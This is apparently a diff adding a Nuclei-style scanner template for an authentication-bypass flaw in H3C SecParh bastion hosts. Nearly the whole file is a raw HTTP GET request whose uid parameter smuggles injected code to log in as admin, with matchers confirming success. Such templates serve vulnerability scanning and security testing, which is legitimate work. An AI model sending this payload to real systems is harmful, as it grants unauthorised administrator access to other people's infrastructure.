@@ -1,0 +1,26 @@
+id: poc-yaml-h3c-secparh-any-user-login
+
+info:
+  name: poc-yaml-h3c-secparh-any-user-login
+  author: Print1n(https://print1n.top)
+  severity: high
+  tags: xray-converted,ct-158285
+  reference:
+    - https://blog.csdn.net/weixin_43886632/article/details/117077168
+    - https://www.o2oxy.cn/3401.html
+
+http:
+  - raw:
+      - |
+        GET /audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=admin HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "admin"
